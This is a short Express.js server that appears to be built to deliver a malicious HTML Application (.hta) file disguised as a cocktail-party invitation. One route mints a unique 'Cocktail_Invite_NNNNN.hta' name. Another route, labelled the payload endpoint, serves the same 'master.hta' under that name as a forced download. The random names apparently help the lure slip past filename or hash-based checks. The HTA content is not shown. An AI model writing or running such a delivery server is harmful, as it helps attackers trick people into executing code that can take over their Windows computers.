const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

// Serve static files (index.html, confirmed.html)
app.use(express.static('public'));

// 1. The Bridge: Generates a unique token and filename
app.get('/bridge', (req, res) => {
    // Generate a random 5-digit number for uniqueness
    const randomId = crypto.randomInt(10000, 99999);
    const uniqueName = `Cocktail_Invite_${randomId}.hta`;
    
    // Redirect to the confirmation page, passing the unique name as a parameter
    res.redirect(`/confirmed.html?file=${uniqueName}`);
});

// 2. The Payload Endpoint: Serves the actual HTA with the unique name
app.get('/payload/:filename', (req, res) => {
    // We always serve the same 'master.hta' file, but tell the browser it has a different name
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('Payload not found.');
    }

    // Set headers to force download with the UNIQUE name generated in /bridge
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    
    // Send the file content
    res.sendFile(filePath);
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});